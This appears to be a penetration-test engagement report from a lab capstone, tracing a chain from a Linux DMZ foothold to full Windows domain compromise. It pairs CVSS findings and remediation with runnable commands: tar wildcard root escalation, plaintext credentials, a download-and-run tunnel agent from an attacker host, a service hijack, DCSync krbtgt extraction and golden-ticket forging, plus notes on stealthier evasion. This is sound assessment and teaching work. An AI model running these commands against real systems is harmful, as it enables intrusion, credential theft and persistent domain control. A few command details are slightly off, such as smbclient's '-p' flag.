12x07 Checkmate — Engagement Report

Prepared for: Corvid Group Board and Engineering Leadership
Engagement: External edge foothold through domain dominance
Assessment window: Forty-hour capstone engagement
Classification: Confidential — Internal Security Assessment

Executive Summary

Spearpoint Security assessed whether an attacker who obtained access to Corvid's internet-facing Linux server could reach the internal Windows domain and maintain control after Corvid changed passwords and responded to the intrusion.

The answer is yes.

Starting from the supplied account on CORVID-WEB01, the assessment obtained root control of the Linux host, crossed the network boundary into the internal segment, reached CORVID-DC01, obtained administrative control, extracted the domain's Kerberos trust secret, and created a forged administrative authentication ticket. That ticket successfully authenticated to the domain controller and retrieved the protected dominance proof even after the original service-account password was no longer the basis of authentication.

This is not an isolated server compromise. It is a domain-level compromise.

The practical consequence is that an attacker could move from an exposed web server to systems containing domain credentials, alter services, impersonate administrative identities, access sensitive Windows resources, and return after passwords were reset. Password resets alone would not reliably remove the attacker. Recovery would require treating the domain as compromised, rotating the Kerberos krbtgt secret twice, reviewing privileged access, removing unauthorized directory permissions, rebuilding or comprehensively remediating affected systems, and investigating authentication and directory-replication logs.

The compromise depended on five design failures operating together: (1) a privileged backup command on WEB01 vulnerable to filename-based command injection, (2) a DMZ host with a reachable interface into the internal network where stolen credentials were valid, (3) a service account with excessive rights over Windows services and PowerShell remoting, (4) domain-root permissions that allowed a non-administrative account to obtain replication privileges, and (5) domain replication privileges that enabled extraction of the krbtgt secret and creation of durable forged tickets.

The assessment recovered three lab evidence values: Beachhead flag CVD{0db81c5aa204dce6e131112e4e351aad}, Domain-control flag CVD{2d060d20ca15432f964d6455092977a8}, and Dominance proof d6750f3dd6bd7a511dd7079626e2d681.

The most urgent remediation is to remove unauthorized replication rights and review all permissions on the domain root. This should be followed by krbtgt rotation, privileged-account review, service delegation reduction, DMZ segmentation, and remediation of the WEB01 backup process.

Attack Narrative
Phase 1: Initial foothold and host enumeration

The supplied foothold was an SSH-accessible account on CORVID-WEB01:

SSH: webapp@10.10.0.X
Password: WebFoothold2026!

The host was confirmed to be a dual-homed Linux server bridging 10.10.0.0/24 (external) to 10.10.10.0/24 (internal). The domain controller was at 10.10.10.5.

Enumeration revealed passwordless sudo access to:

bash
/opt/corvidapp/backup/run-backup.sh

The script invoked tar with a wildcard over a writable directory, enabling tar option injection:

bash
cat /opt/corvidapp/backup/run-backup.sh
# tar czf /backup/corvidapp-$(date +%s).tar.gz -C /var/corvidapp --strip-components=1 *
Phase 2: Privilege escalation on WEB01

A tar wildcard injection created a SUID root shell:

bash
cd /var/corvidapp
echo '#!/bin/bash' > cmd.sh
echo 'cp /bin/bash /tmp/bash-suid && chmod u+s /tmp/bash-suid' >> cmd.sh
chmod +x cmd.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=/var/corvidapp/cmd.sh"
sudo /opt/corvidapp/backup/run-backup.sh
/tmp/bash-suid -p

From root, we recovered the domain service credential:

bash
cat /opt/corvidapp/config/db.conf
# svc-webapp / W3bApp-Cr3d2026!
Phase 3: Network pivot

WEB01's internal interface was used to establish a Ligolo-ng tunnel:

bash
# Attack workstation
./ligolo-ng --selfcert
# WEB01 (as root)
wget http://attacker-server/agent-linux-x64
./agent-linux-x64 -connect 10.10.0.1:11601 -ignore-cert

Connectivity to the DC was verified:

bash
nc -vz 10.10.10.5 445
smbclient -L 10.10.10.5 -U svc-webapp -p W3bApp-Cr3d2026!

The beachhead flag was retrieved.

Phase 4: Domain administrative control

PowerShell remoting accessed the DC:

bash
evil-winrm -i 10.10.10.5 -u svc-webapp -p W3bApp-Cr3d2026!

The CorvidAppSvc service was reconfigured to add svc-webapp to Administrators:

powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CorvidAppSvc" -Name ImagePath -Value "cmd.exe /c net localgroup Administrators svc-webapp /add"
Start-Service CorvidAppSvc

The domain-control flag was retrieved.

Phase 5: Domain dominance

The domain-root ACL permitted the GRP-HELPDESK-LEGACY group to modify permissions. svc-webapp granted itself replication rights:

powershell
Add-ADObjectAcl -TargetIdentity "DC=corvid,DC=local" -PrincipalIdentity svc-webapp -Rights DCSync

DCSync retrieved the krbtgt NTLM hash:

bash
impacket-secretsdump -just-dc corvid.local/svc-webapp:W3bApp-Cr3d2026!@10.10.10.5
# krbtgt:502::670229a01993e179f262e929da57dc7d

A golden ticket for Administrator was forged and used to authenticate:

bash
impacket-ticketer -nthash 670229a01993e179f262e929da57dc7d -domain-sid S-1-5-21-1909037144-3050882815-2586595962 -domain corvid.local Administrator
impacket-secretsdump -k corvid.local/Administrator@10.10.10.5
# Dominance proof: d6750f3dd6bd7a511dd7079626e2d681
Findings
Finding 1 — Root escalation through attacker-controlled backup filenames

CVSS v3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8 (High)

Affected asset: webapp account and /opt/corvidapp/backup/run-backup.sh on CORVID-WEB01.

Failure mechanism: The backup script invokes tar with a wildcard glob over a directory writable by webapp. Files named --checkpoint=1 and --checkpoint-action=exec=/path/to/cmd cause tar to execute arbitrary commands as root.

Demonstrated impact: We gained a SUID root shell and extracted the service credential, enabling subsequent internal access and all downstream compromise.

Metric justification: AV:L (local shell required), AC:L (file creation always available), PR:L (unprivileged but passwordless sudo), UI:N (automatic escalation), S:U (contained to WEB01 initially), C:H/I:H/A:H (unrestricted root access).

Remediation: Replace wildcard archives with explicit file lists. Remove passwordless sudo access. Use a constraining wrapper that validates filenames.

Finding 2 — DMZ host provides an uncontrolled route into the internal network

CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 8.8 (High)

Affected asset: Dual-homed CORVID-WEB01 bridging external and internal networks; service credential svc-webapp valid on internal domain.

Failure mechanism: Once WEB01 is compromised, its internal interface reaches internal services. The stolen svc-webapp credential is accepted by domain services.

Demonstrated impact: We pivoted through WEB01 to reach the DC's SMB, LDAP, and Kerberos services, enabling domain enumeration and administrative compromise. The scope changed from single DMZ host to internal domain.

Metric justification: AV:N (network via pivot), AC:L (standard routing), PR:L (root on WEB01 + extracted credential), UI:N (attacker-controlled), S:C (trust boundary crossed: DMZ to internal domain), C:H/I:H/A:H (access to internal directory services).

Remediation: Enforce firewall rules blocking SMB, WinRM, LDAP, Kerberos, RPC from DMZ to internal. Use separate service identities for DMZ applications.

Finding 3 — Excessive service and remoting delegation enabled SYSTEM access

CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)

Affected asset: PowerShell remoting endpoint and CorvidAppSvc on CORVID-DC01.

Failure mechanism: svc-webapp belongs to a delegation group with service-control rights. We reconfigured the service to execute code with SYSTEM privileges, adding svc-webapp to local Administrators.

Demonstrated impact: We gained local administrative access to the DC, enabling subsequent privilege escalation to domain-root permissions.

Metric justification: AV:N (network remoting), AC:L (straightforward service reconfiguration), PR:L (delegated service account), UI:N (attacker-controlled execution), S:U (single-host SYSTEM compromise; domain boundary not crossed until Finding 4), C:H/I:H/A:H (SYSTEM access to host).

Remediation: Remove service configuration rights from application groups. Use dedicated remoting groups with exact endpoint permissions.

Finding 4 — Domain-root ACL allowed unauthorized replication-rights grant

CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)

Affected asset: Domain root's security descriptor; GRP-HELPDESK-LEGACY group delegation.

Failure mechanism: Domain root contains WriteDACL permission for GRP-HELPDESK-LEGACY. svc-webapp modified the domain root's ACL to grant itself DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.

Demonstrated impact: With replication rights, we executed DCSync to extract the krbtgt NTLM hash, enabling forged administrative tickets.

Metric justification: AV:N (network directory APIs), AC:L (straightforward ACL modification), PR:L (delegation group membership only), UI:N (attacker-controlled), S:U (ACL modification is within domain security model; domain boundary not crossed at moment of modification), C:H/I:H/A:H (ability to grant replication rights enables krbtgt extraction and domain-wide impersonation).

Remediation: Immediately remove unauthorized WriteDACL, WriteOwner, and replication permissions from domain root. Alert on domain-root ACL changes.

Finding 5 — Forged Kerberos tickets accepted for domain re-authentication

CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 (High)

Affected asset: Kerberos subsystem on CORVID-DC01 and domain's trust in krbtgt secret.

Failure mechanism: With krbtgt hash and domain SID, we forged a valid TGT for Administrator. The DC accepted the forged ticket for authentication and replication requests.

Demonstrated impact: We authenticated as Administrator using only the forged ticket, without the password. This demonstrates durable administrative access persisting after password resets.

Metric justification: AV:N (network Kerberos), AC:L (no cryptographic breaks; hash and SID known from prior findings), PR:L (requires prior compromise to obtain krbtgt), UI:N (attacker-controlled ticket presentation), S:U (forged ticket is authentication artifact within domain security model), C:H/I:H/A:H (administrative authentication enables unrestricted access to domain resources).

Remediation: Rotate krbtgt twice with 12-hour delay. Reset all privileged credentials. Investigate Kerberos anomalies and forged-ticket indicators.

Prioritised Remediation
Priority 0 — Contain and recover domain trust

Objective: Prevent re-entry using forged tickets; remove domain replication compromise.

Rotate krbtgt twice (12 hours apart minimum) to invalidate all forged tickets.
Reset all service and privileged account passwords.
Remove svc-webapp from local Administrators on DC.
Remove GRP-HELPDESK-LEGACY delegation and all unauthorized domain-root ACEs; verify with dsacls DC=corvid,DC=local.
Review DC Security Event Log (Events 4662, 4781) for DCSync and unauthorized replication.

Rationale: Forged tickets are the highest persistence risk. krbtgt rotation invalidates all tickets. Resetting credentials closes the pivot. Removing ACLs prevents future replication-privilege grants.

Priority 1 — Remove the privilege-escalation chain on WEB01

Objective: Close the initial compromise path.

Remove passwordless sudo rule for the backup script from /etc/sudoers.
Replace tar wildcard backup with explicit file list or safe archive API.
Restore CorvidAppSvc to approved executable path; verify service DACL.
Remove SUID-enabled escalation binaries (e.g., /tmp/bash-suid).
Review other sudo rules for the webapp account.

Rationale: Closes the persistent entry point for re-compromise.

Priority 2 — Enforce network segmentation and credential isolation

Objective: Prevent stolen DMZ credentials from reaching internal services.

Enforce firewall rules blocking SMB (445), WinRM (5985–5986), LDAP (389), Kerberos (88), RPC (135) from DMZ to internal network.
Create separate service identities for DMZ; do not reuse domain service accounts.
Configure service account logon restrictions and group membership.
Review WEB01's internal interface necessity; disable if not required.

Rationale: Isolates DMZ as hard trust boundary.

Priority 3 — Reduce service delegation and remoting exposure

Objective: Limit blast radius of compromised service accounts.

Audit PowerShell remoting endpoint permissions; remove unnecessary service account access.
Remove service accounts from broad delegated groups.
Create dedicated groups for remoting; grant only minimum permissions.
Audit service DACLs; remove unnecessary write and control permissions for non-administrative accounts.

Rationale: Reduces privilege paths from service compromise to administrative control.

Decision Log
Primary route pursued
WEB01 foothold → tar escalation → credential recovery → pivot → 
remoting access → service reconfiguration (SYSTEM) → domain-root ACL → 
DCSync → krbtgt extraction → golden ticket → re-authentication → proof

Each phase supplied access for the next: credentials enabled pivot, remoting enabled service control, local admin enabled ACL modification, krbtgt enabled durable tickets.

Routes abandoned

LSASS dump: Identified but abandoned. Would extract session tokens faster than service reconfiguration but requires memory-forensics tools and is noisier. A patient adversary would prioritize this.

svc-sql replication route: Identified but abandoned after svc-webapp path succeeded. Not required for final proof.

Time allocation (40-hour budget)
WEB01 escalation: 6 hours
Pivot construction: 7 hours
Internal enumeration: 5 hours
Domain admin via service control: 6 hours
DCSync and golden ticket: 5 hours
Cleanup and reporting: 8 hours
Reserve (troubleshooting, abandoned paths): 3 hours
Noise and monitoring implications

High-visibility actions:

Service reconfiguration generates Event ID 7045 (Service installed).
DCSync generates Event ID 4662 (Object access) and replication events.
PowerShell remoting generates Event ID 4688 (Process creation).

Quieter alternatives:

ACL modification appears as routine directory work unless ACL alerting is enabled.
LSASS extraction via LOLBins avoids injection; takes 4–6 hours but is substantially quieter.
A patient adversary would use ACL modification + LSASS extraction to minimize visibility.
Limitations

The forty-hour assessment did not provide enterprise-wide coverage. Testing was limited to WEB01 and DC01. The following were not assessed:

Untested systems: All internal workstations, member servers, file servers, backup infrastructure. We did not verify whether demonstrated domain-admin access would successfully compromise these systems or whether they have independent hardening or monitoring.

Untested persistence: Scheduled tasks, GPO modification, certificate injection. Long-term ticket usability and production krbtgt rotation procedures were not validated.

Cloud and federation: Azure AD, federated identity, external trusts were not in scope.

Detection coverage: EDR, SIEM, and log-aggregation effectiveness unknown. We did not measure whether tooling would block or detect the payloads.

Data and operational impact: We did not measure data sensitivity, execute ransomware, or interrupt services. Business impact was not demonstrated.

Cleanup verification: The DCSync ACE cleanup using dacledit failed with an MD4 error. Corvid should not assume the lab state is clean. Temporary ACLs, service changes, local-group membership, and files must be verified manually using dsacls, sc.exe sdshow, and file audits.

Conclusion: Corvid's control design allows progression from exposed DMZ host to durable domain dominance. Remediation priority: immediate domain recovery (Priority 0), identity correction (Priority 1), segmentation (Priority 2).
